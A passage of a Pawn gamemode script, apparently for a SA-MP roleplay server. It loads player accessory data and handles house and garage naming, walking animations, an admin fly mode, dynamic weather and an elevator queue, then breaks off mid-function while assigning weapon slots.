	Player[playerid][pToyRY][4] = dini_Float(file, "tRY4");	Player[playerid][pToyRY][5] = dini_Float(file, "tRY5");	Player[playerid][pToyRY][6] = dini_Float(file, "tRY6");	Player[playerid][pToyRY][7] = dini_Float(file, "tRY7");
	Player[playerid][pToyRY][8] = dini_Float(file, "tRY8");	Player[playerid][pToyRY][9] = dini_Float(file, "tRY9");
	// Toy RZ
	Player[playerid][pToyRZ][0] = dini_Float(file, "tRZ0");	Player[playerid][pToyRZ][1] = dini_Float(file, "tRZ1");	Player[playerid][pToyRZ][2] = dini_Float(file, "tRZ2");	Player[playerid][pToyRZ][3] = dini_Float(file, "tRZ3");
	Player[playerid][pToyRZ][4] = dini_Float(file, "tRZ4");	Player[playerid][pToyRZ][5] = dini_Float(file, "tRZ5");	Player[playerid][pToyRZ][6] = dini_Float(file, "tRZ6");	Player[playerid][pToyRZ][7] = dini_Float(file, "tRZ7");
	Player[playerid][pToyRZ][8] = dini_Float(file, "tRZ8");	Player[playerid][pToyRZ][9] = dini_Float(file, "tRZ9");
	// Toy SX
	Player[playerid][pToySX][0] = dini_Float(file, "tSX0");	Player[playerid][pToySX][1] = dini_Float(file, "tSX1");	Player[playerid][pToySX][2] = dini_Float(file, "tSX2");	Player[playerid][pToySX][3] = dini_Float(file, "tSX3");
	Player[playerid][pToySX][4] = dini_Float(file, "tSX4");	Player[playerid][pToySX][5] = dini_Float(file, "tSX5");	Player[playerid][pToySX][6] = dini_Float(file, "tSX6");	Player[playerid][pToySX][7] = dini_Float(file, "tSX7");
	Player[playerid][pToySX][8] = dini_Float(file, "tSX8");	Player[playerid][pToySX][9] = dini_Float(file, "tSX9");
	// Toy SY
	Player[playerid][pToySY][0] = dini_Float(file, "tSY0");	Player[playerid][pToySY][1] = dini_Float(file, "tSY1");	Player[playerid][pToySY][2] = dini_Float(file, "tSY2");	Player[playerid][pToySY][3] = dini_Float(file, "tSY3");
	Player[playerid][pToySY][4] = dini_Float(file, "tSY4");	Player[playerid][pToySY][5] = dini_Float(file, "tSY5");	Player[playerid][pToySY][6] = dini_Float(file, "tSY6");	Player[playerid][pToySY][7] = dini_Float(file, "tSY7");
	Player[playerid][pToySY][8] = dini_Float(file, "tSY8");	Player[playerid][pToySY][9] = dini_Float(file, "tSY9");
	// Toy SZ
	Player[playerid][pToySZ][0] = dini_Float(file, "tSZ0");	Player[playerid][pToySZ][1] = dini_Float(file, "tSZ1");	Player[playerid][pToySZ][2] = dini_Float(file, "tSZ2");	Player[playerid][pToySZ][3] = dini_Float(file, "tSZ3");
	Player[playerid][pToySZ][4] = dini_Float(file, "tSZ4");	Player[playerid][pToySZ][5] = dini_Float(file, "tSZ5");	Player[playerid][pToySZ][6] = dini_Float(file, "tSZ6");	Player[playerid][pToySZ][7] = dini_Float(file, "tSZ7");
	Player[playerid][pToySZ][8] = dini_Float(file, "tSZ8");	Player[playerid][pToySZ][9] = dini_Float(file, "tSZ9");
	for(new i=0; i<10; i++) // Toys
    {
	 	if(Player[playerid][pToySX][i] == 0) Player[playerid][pToySX][i] = 1;
	    if(Player[playerid][pToySY][i] == 0) Player[playerid][pToySY][i] = 1;
	    if(Player[playerid][pToySZ][i] == 0) Player[playerid][pToySZ][i] = 1;
    }
	return 1;
}

stock RPTN(playerid, slot)
{
    new name[24], toy = Player[playerid][pToyModel][slot];
    format(name, sizeof(name), "None");
    // Model assigning
	if(toy >= 19006 && toy <= 19035) format(name, sizeof(name), "Glasses");
	else if(toy >= 19039 && toy <= 19053) format(name, sizeof(name), "Watch");
	else if(toy >= 18891 && toy <= 18910) format(name, sizeof(name), "Bandana");
	else if(toy >= 18926 && toy <= 18935) format(name, sizeof(name), "Hat");
	else if(toy >= 18911 && toy <= 18920) format(name, sizeof(name), "Mask");
	else if(toy == 18640 || toy == 18975 || toy == 19077 || toy == 19136 || toy == 19274) format(name, sizeof(name), "Hair");
	else if(toy == 18643 || toy >= 19080 && toy <= 19084) format(name, sizeof(name), "Laser");
	else if(toy >= 19421 && toy <= 19424) format(name, sizeof(name), "Headphones");
	else if(toy == 19317) format(name, sizeof(name), "Guitar");
	else if(toy == 19352) format(name, sizeof(name), "TopHat");
	else if(toy == 18645 || toy >= 18976 && toy <= 18979) format(name, sizeof(name), "Motorcycle Helmet");
	else if(toy == 18675) format(name, sizeof(name), "Smoke Puff");
	return name;
}

stock HT(idx)
{
	new ht[50];
    if(!HouseInfo[idx][hLevel]) format(ht, sizeof(ht), "None");
	else if(HouseInfo[idx][hLevel] == 1) format(ht, sizeof(ht), "Small Appartment");
	else if(HouseInfo[idx][hLevel] == 2) format(ht, sizeof(ht), "Medium Appartment");
	else if(HouseInfo[idx][hLevel] == 3) format(ht, sizeof(ht), "Large Appartment");
	else if(HouseInfo[idx][hLevel] == 4) format(ht, sizeof(ht), "Small Crib");
	else if(HouseInfo[idx][hLevel] == 5) format(ht, sizeof(ht), "Medium Crib");
	else if(HouseInfo[idx][hLevel] == 6) format(ht, sizeof(ht), "Large Crib");
	else if(HouseInfo[idx][hLevel] == 7) format(ht, sizeof(ht), "Small Mansion");
	else if(HouseInfo[idx][hLevel] == 8) format(ht, sizeof(ht), "Medium Mansion");
	else if(HouseInfo[idx][hLevel] == 9) format(ht, sizeof(ht), "Luxury Mansion");
	else if(HouseInfo[idx][hLevel] == 10)format(ht, sizeof(ht), "Luxury Villa");
	else if(HouseInfo[idx][hLevel] == 11)format(ht, sizeof(ht), "Huge Luxury Villa");
	else if(HouseInfo[idx][hLevel] == 12)format(ht, sizeof(ht), "Palace");
   	return ht;
}
stock GT(idx)
{
	new ht[50];
	if(!GarageInfo[idx][gLevel]) format(ht, sizeof(ht), "None");
	else if(GarageInfo[idx][gLevel] == 1) format(ht, sizeof(ht), "Small Garage");
	return ht;
}

stock GTT(idx)
{
	new ht[50];
	if(GarageInfo[idx][gLevel] == 1) format(ht, sizeof(ht), "Space for 1 vehicle");
	return ht;
}
stock NoAuth(playerid)
{
    SendClientMessage(playerid, COLOR_GRAD2, "You are not authorized to use this command.");
    return 1;
}
stock NoDuty(playerid)
{
    SendClientMessage(playerid, COLOR_GRAD2, "You are not authorized to use this command as you are off duty.");
    return 1;
}
stock NoLogin(playerid)
{
    SendClientMessage(playerid, COLOR_GRAD2, "You are not logged in, You're not able to use the command.");
    return 1;
}
stock NoLoginB(playerid)
{
    SendClientMessage(playerid, COLOR_GRAD2, "That player is not connected or logged in.");
    return 1;
}
stock NoCookie(playerid)
{
    SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough cookies on you for that.");
    return 1;
}
public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
    return 1;
}

forward login_dialog(playerid);
public login_dialog(playerid)
{
   	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	Streamer_UpdateEx(playerid,370.0804,-2087.8767,7.8359);
	SetPlayerPos(playerid,370.0804,-2087.8767,-10.0);
	SetPlayerCameraPos(playerid,423.3802,-2067.7915,29.8605);
	SetPlayerCameraLookAt(playerid,370.0804,-2087.8767,7.8359);
    return 1;
}
stock SetPlayerWalkingStyle(playerid, style)
{
	Player[playerid][pWalk] = style;
}
stock SetPlayerGender(playerid, gender)
{
	Player[playerid][pGender] = gender;
}
stock SetPlayerAge(playerid, ages)
{
	Player[playerid][pAge] = ages;
}
stock GetPlayerWalkingStyle(playerid)
{
	return Player[playerid][pWalk];
}

forward WalkAnim(playerid);
public WalkAnim(playerid)
{
	new keys, updown, leftright;
	GetPlayerKeys(playerid,keys,updown,leftright);
	if (GetPlayerWalkingStyle(playerid) == WALK_NORMAL)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_player",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_player",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_PED)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_civi",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_civi",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
 	else if (GetPlayerWalkingStyle(playerid) == WALK_GANGSTA)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_gang1",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_gang1",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_GANGSTA2)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_gang2",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_gang2",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_OLD)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_old",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_old",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_FAT_OLD)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_fatold",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_fatold",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_FAT)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_fat",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_fat",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_LADY)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walknorm",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walknorm",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_LADY2)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walkbusy",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walkbusy",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_WHORE)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walkpro",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walkpro",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_WHORE2)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WOMAN_walksexy",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WOMAN_walksexy",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_DRUNK)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_drunk",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_drunk",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_BLIND)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","Walk_Wuzi",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","Walk_Wuzi",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	return true;
}

stock ShowMainMenuGUI(playerid)
{
    new string[128], day[256], updates[1048];
 	format(string, sizeof(string), "%s", SMOTD);
  	TextDrawSetString(MOTDDraw, string);
  	format(day, sizeof(day), "%s", SpecialDay());
	TextDrawSetString(SPDNDDraw, day);
	format(updates, 1048, "%s~n~%s~n~%s~n~%s~n~%s", UPDATE1, UPDATE2, UPDATE3, UPDATE4, UPDATE5);
	TextDrawSetString(UpdatesTD1, updates);
	for(new i = 0; i < 12; i++)
	{
		TextDrawShowForPlayer(playerid, MainMenuTxtdraw[i]);
	}
	TextDrawShowForPlayer(playerid, TS3Draw);
	TextDrawShowForPlayer(playerid, ForumDraw);
	TextDrawShowForPlayer(playerid, MOTDraw);
	TextDrawShowForPlayer(playerid, MOTDDraw);
	TextDrawShowForPlayer(playerid, SPDNDraw);
	TextDrawShowForPlayer(playerid, SPDNDDraw);
	TextDrawShowForPlayer(playerid, UpdatesTD);
	TextDrawShowForPlayer(playerid, UpdatesTD1);
	return 1;
}

stock HideMainMenuGUI(playerid)
{
	for(new i = 0; i < 12; i++)
	{
		TextDrawHideForPlayer(playerid, MainMenuTxtdraw[i]);
	}
    TextDrawHideForPlayer(playerid, TS3Draw);
	TextDrawHideForPlayer(playerid, ForumDraw);
	TextDrawHideForPlayer(playerid, MOTDraw);
	TextDrawHideForPlayer(playerid, MOTDDraw);
	TextDrawHideForPlayer(playerid, SPDNDraw);
	TextDrawHideForPlayer(playerid, SPDNDDraw);
	TextDrawHideForPlayer(playerid, UpdatesTD);
	TextDrawHideForPlayer(playerid, UpdatesTD1);
	return 1;
}
forward AdminFly(playerid);
public AdminFly(playerid)
{
	if(!IsPlayerConnected(playerid))
		return flying[playerid] = false;

	if(flying[playerid])
	{
	    if(!IsPlayerInAnyVehicle(playerid))
	    {
			new
			    keys,
				ud,
				lr,
				Float:x[2],
				Float:y[2],
				Float:z;

			GetPlayerKeys(playerid, keys, ud, lr);
			GetPlayerVelocity(playerid, x[0], y[0], z);
			if(ud == KEY_UP)
			{
				GetPlayerCameraPos(playerid, x[0], y[0], z);

				GetPlayerCameraFrontVector(playerid, x[1], y[1], z);
    			ApplyAnimation(playerid,"SWIM","SWIM_crawl",6.1,1,1,1,1,0,1);
				SetPlayerToFacePos(playerid, x[0] + x[1], y[0] + y[1]);
				SetPlayerVelocity(playerid, x[1], y[1], z);
			}
			else
			SetPlayerVelocity(playerid, 0.0, 0.0, 0.01);
		}

		SetTimerEx("AdminFly", 100, 0, "d", playerid);
	}

	return 0;
}
forward Float:SetPlayerToFacePos(playerid, Float:X, Float:Y);
public Float:SetPlayerToFacePos(playerid, Float:X, Float:Y)
{
	new
		Float:pX1,
		Float:pY1,
		Float:pZ1,
		Float:ang;

	if(!IsPlayerConnected(playerid)) return 0.0;

	GetPlayerPos(playerid, pX1, pY1, pZ1);

	if( Y > pY1 ) ang = (-acos((X - pX1) / floatsqroot((X - pX1)*(X - pX1) + (Y - pY1)*(Y - pY1))) - 90.0);
	else if( Y < pY1 && X < pX1 ) ang = (acos((X - pX1) / floatsqroot((X - pX1)*(X - pX1) + (Y - pY1)*(Y - pY1))) - 450.0);
	else if( Y < pY1 ) ang = (acos((X - pX1) / floatsqroot((X - pX1)*(X - pX1) + (Y - pY1)*(Y - pY1))) - 90.0);

	if(X > pX1) ang = (floatabs(floatabs(ang) + 180.0));
	else ang = (floatabs(ang) - 180.0);

	ang += 180.0;

	SetPlayerFacingAngle(playerid, ang);

 	return ang;
}
forward DynamicWeather();
public DynamicWeather()
{
   GlobalWeather = random(17);
   SetWeather(GlobalWeather);
   return 1;
}
// FBI Elevator Functions Forwards
// Public:
forward CallElevator(playerid, floorid);    // You can use INVALID_PLAYER_ID too.
forward ShowElevatorDialog(playerid);

// Private:
forward Elevator_Initialize();
forward Elevator_Destroy();

forward Elevator_OpenDoors();
forward Elevator_CloseDoors();
forward Floor_OpenDoors(floorid);
forward Floor_CloseDoors(floorid);

forward Elevator_MoveToFloor(floorid);
forward Elevator_Boost(floorid);        	// Increases the elevator speed until it reaches 'floorid'.
forward Elevator_TurnToIdle();

forward ReadNextFloorInQueue();
forward RemoveFirstQueueFloor();
forward AddFloorToQueue(floorid);
forward IsFloorInQueue(floorid);
forward ResetElevatorQueue();

forward DidPlayerRequestElevator(playerid);

forward Float:GetElevatorZCoordForFloor(floorid);
forward Float:GetDoorsZCoordForFloor(floorid);

stock Elevator_Initialize()
{
	// Initializes the elevator.

	Obj_Elevator 			= CreateObject(18755, 1786.678100, -1303.459472, GROUND_Z_COORD + ELEVATOR_OFFSET, 0.000000, 0.000000, 270.000000);
	Obj_ElevatorDoors[0] 	= CreateObject(18757, X_DOOR_CLOSED, -1303.459472, GROUND_Z_COORD, 0.000000, 0.000000, 270.000000);
	Obj_ElevatorDoors[1] 	= CreateObject(18756, X_DOOR_CLOSED, -1303.459472, GROUND_Z_COORD, 0.000000, 0.000000, 270.000000);

	new string[128];

	for(new i; i < sizeof(Obj_FloorDoors); i ++)
	{
	    Obj_FloorDoors[i][0] 	= CreateObject(18757, X_DOOR_CLOSED, -1303.171142, GetDoorsZCoordForFloor(i), 0.000000, 0.000000, 270.000000);
		Obj_FloorDoors[i][1] 	= CreateObject(18756, X_DOOR_CLOSED, -1303.171142, GetDoorsZCoordForFloor(i), 0.000000, 0.000000, 270.000000);

		format(string, sizeof(string), "%s\nPress 'F' to call", FloorNames[i]);
		// Label_Elevator, Text3D:Label_Floors[21];
	}

	// Open ground floor doors:
	Floor_OpenDoors(0);
	Elevator_OpenDoors();

	return 1;
}

stock Elevator_Destroy()
{
	// Destroys the elevator.

	DestroyObject(Obj_Elevator);
	DestroyObject(Obj_ElevatorDoors[0]);
	DestroyObject(Obj_ElevatorDoors[1]);

	for(new i; i < sizeof(Obj_FloorDoors); i ++)
	{
	    DestroyObject(Obj_FloorDoors[i][0]);
		DestroyObject(Obj_FloorDoors[i][1]);
	}

	return 1;
}

stock Elevator_OpenDoors()
{
	// Opens the elevator's doors.

	new Float:x, Float:y, Float:z;

	GetObjectPos(Obj_ElevatorDoors[0], x, y, z);
	MoveObject(Obj_ElevatorDoors[0], X_DOOR_L_OPENED, y, z, DOORS_SPEED);
	MoveObject(Obj_ElevatorDoors[1], X_DOOR_R_OPENED, y, z, DOORS_SPEED);

	return 1;
}

stock Elevator_CloseDoors()
{
    // Closes the elevator's doors.

    if(ElevatorState == ELEVATOR_STATE_MOVING)
	    return 0;

    new Float:x, Float:y, Float:z;

	GetObjectPos(Obj_ElevatorDoors[0], x, y, z);
	MoveObject(Obj_ElevatorDoors[0], X_DOOR_CLOSED, y, z, DOORS_SPEED);
	MoveObject(Obj_ElevatorDoors[1], X_DOOR_CLOSED, y, z, DOORS_SPEED);

	return 1;
}

stock Floor_OpenDoors(floorid)
{
    // Opens the doors at the specified floor.

    MoveObject(Obj_FloorDoors[floorid][0], X_DOOR_L_OPENED, -1303.171142, GetDoorsZCoordForFloor(floorid), DOORS_SPEED);
	MoveObject(Obj_FloorDoors[floorid][1], X_DOOR_R_OPENED, -1303.171142, GetDoorsZCoordForFloor(floorid), DOORS_SPEED);

	return 1;
}

stock Floor_CloseDoors(floorid)
{
    // Closes the doors at the specified floor.

    MoveObject(Obj_FloorDoors[floorid][0], X_DOOR_CLOSED, -1303.171142, GetDoorsZCoordForFloor(floorid), DOORS_SPEED);
	MoveObject(Obj_FloorDoors[floorid][1], X_DOOR_CLOSED, -1303.171142, GetDoorsZCoordForFloor(floorid), DOORS_SPEED);

	return 1;
}

stock Elevator_MoveToFloor(floorid)
{
	// Moves the elevator to specified floor (doors are meant to be already closed).

	ElevatorState = ELEVATOR_STATE_MOVING;
	ElevatorFloor = floorid;

	// Move the elevator slowly, to give time to clients to sync the object surfing. Then, boost it up:
	MoveObject(Obj_Elevator, 1786.678100, -1303.459472, GetElevatorZCoordForFloor(floorid), 0.5);
    MoveObject(Obj_ElevatorDoors[0], X_DOOR_CLOSED, -1303.459472, GetDoorsZCoordForFloor(floorid), 0.5);
    MoveObject(Obj_ElevatorDoors[1], X_DOOR_CLOSED, -1303.459472, GetDoorsZCoordForFloor(floorid), 0.5);

	ElevatorBoostTimer = SetTimerEx("Elevator_Boost", 2000, 0, "i", floorid);

	return 1;
}

public Elevator_Boost(floorid)
{
	// Increases the elevator's speed until it reaches 'floorid'

	MoveObject(Obj_Elevator, 1786.678100, -1303.459472, GetElevatorZCoordForFloor(floorid), ELEVATOR_SPEED);
    MoveObject(Obj_ElevatorDoors[0], X_DOOR_CLOSED, -1303.459472, GetDoorsZCoordForFloor(floorid), ELEVATOR_SPEED);
    MoveObject(Obj_ElevatorDoors[1], X_DOOR_CLOSED, -1303.459472, GetDoorsZCoordForFloor(floorid), ELEVATOR_SPEED);

	return 1;
}

public Elevator_TurnToIdle()
{
	ElevatorState = ELEVATOR_STATE_IDLE;
	ReadNextFloorInQueue();

	return 1;
}

stock RemoveFirstQueueFloor()
{
	// Removes the data in ElevatorQueue[0], and reorders the queue accordingly.

	for(new i; i < sizeof(ElevatorQueue) - 1; i ++)
	    ElevatorQueue[i] = ElevatorQueue[i + 1];

	ElevatorQueue[sizeof(ElevatorQueue) - 1] = INVALID_FLOOR;

	return 1;
}

stock AddFloorToQueue(floorid)
{
 	// Adds 'floorid' at the end of the queue.

	// Scan for the first empty space:
	new slot = -1;
	for(new i; i < sizeof(ElevatorQueue); i ++)
	{
	    if(ElevatorQueue[i] == INVALID_FLOOR)
	    {
	        slot = i;
	        break;
	    }
	}

	if(slot != -1)
	{
	    ElevatorQueue[slot] = floorid;

     	// If needed, move the elevator.
	    if(ElevatorState == ELEVATOR_STATE_IDLE)
	        ReadNextFloorInQueue();

	    return 1;
	}

	return 0;
}

stock ResetElevatorQueue()
{
	// Resets the queue.

	for(new i; i < sizeof(ElevatorQueue); i ++)
	{
	    ElevatorQueue[i] 	= INVALID_FLOOR;
	    FloorRequestedBy[i] = INVALID_PLAYER_ID;
	}

	return 1;
}

stock IsFloorInQueue(floorid)
{
	// Checks if the specified floor is currently part of the queue.

	for(new i; i < sizeof(ElevatorQueue); i ++)
	    if(ElevatorQueue[i] == floorid)
	        return 1;

	return 0;
}

stock ReadNextFloorInQueue()
{
	// Reads the next floor in the queue, closes doors, and goes to it.

	if(ElevatorState != ELEVATOR_STATE_IDLE || ElevatorQueue[0] == INVALID_FLOOR)
	    return 0;

	Elevator_CloseDoors();
	Floor_CloseDoors(ElevatorFloor);

	return 1;
}

stock DidPlayerRequestElevator(playerid)
{
	for(new i; i < sizeof(FloorRequestedBy); i ++)
	    if(FloorRequestedBy[i] == playerid)
	        return 1;

	return 0;
}


stock CallElevator(playerid, floorid)
{
	// Calls the elevator (also used with the elevator dialog).

	if(FloorRequestedBy[floorid] != INVALID_PLAYER_ID || IsFloorInQueue(floorid))
	    return 0;

	FloorRequestedBy[floorid] = playerid;
	AddFloorToQueue(floorid);

	return 1;
}

stock Float:GetElevatorZCoordForFloor(floorid)
    return (GROUND_Z_COORD + FloorZOffsets[floorid] + ELEVATOR_OFFSET); // A small offset for the elevator object itself.

stock Float:GetDoorsZCoordForFloor(floorid)
	return (GROUND_Z_COORD + FloorZOffsets[floorid]);

stock ShowElevatorDialog(playerid)
{
	new string[512];
	for(new i; i < sizeof(ElevatorQueue); i ++)
	{
	    if(FloorRequestedBy[i] != INVALID_PLAYER_ID)
	        strcat(string, "{FF0000}");

	    strcat(string, FloorNames[i]);
	    strcat(string, "\n");
	}

	ShowPlayerDialog(playerid, DIALOG_ID, DIALOG_STYLE_LIST, "Elevator", string, "Accept", "Cancel");

	return 1;
}

forward Three();
public Three()
{
 	SendClientMessageToAll(COLOR_LIGHTBLUE, "3");
	return 1;
}

forward Two();
public Two()
{
	SendClientMessageToAll(COLOR_LIGHTBLUE, "2");
	return 1;
}

forward One();
public One()
{
	SendClientMessageToAll(COLOR_LIGHTBLUE, "1");
 	return 1;
}

forward GoGoGo();
public GoGoGo()
{
	SendClientMessageToAll(COLOR_LIGHTBLUE, "Go Go Go!");
 	return 1;
}
stock GivePlayerValidWeapon(playerid, weaponid, ammo)
{
	GunsBeingRemoved[playerid] = 1;
	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	if(weaponid == 0 || weaponid == 1)
	{ // Slot 0
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][0] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 2 || weaponid == 3 || weaponid == 4 || weaponid == 5 || weaponid == 6 || weaponid == 7 || weaponid == 8 || weaponid == 9)
	{ // Slot 1
		GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][1] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 22 || weaponid == 23 || weaponid == 24)
	{ // Slot 2
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][2] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 25 || weaponid == 26 || weaponid == 27)
	{ // Slot 3
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][3] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 28 || weaponid == 29 || weaponid == 32)
	{ // Slot 4
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][4] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 30 || weaponid == 31)
	{ // Slot 5
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][5] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 33 || weaponid == 34)
	{ // Slot 6
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][6] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 35 || weaponid == 36 || weaponid == 37 || weaponid == 38)
	{ // Slot 7
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][7] = weaponid;
	    GunsBeingRemoved[playerid] = 1;
	}
	else if(weaponid == 16 || weaponid == 17 || weaponid == 18 || weaponid == 39)
	{ // Slot 8
	    GunsBeingRemoved[playerid] = 1;
	    Player[playerid][pWeapon][8] = weaponid;
